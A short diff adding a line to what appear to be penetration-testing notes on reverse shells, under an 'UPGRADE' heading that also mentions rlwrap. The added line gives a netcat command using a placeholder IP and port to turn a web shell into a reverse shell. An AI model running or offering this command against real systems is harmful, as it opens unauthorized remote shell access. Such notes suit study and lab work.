@@ -36,3 +36,4 @@ Consider the following example. On the server-side, we will listen on port 1234.
 
 **UPGRADE**
 -[[rlwrap]]
+-`nc <LOCAL-IP> <PORT> -e /bin/bash` turn a web shell into a reverse shell (execute the command in the web shell)
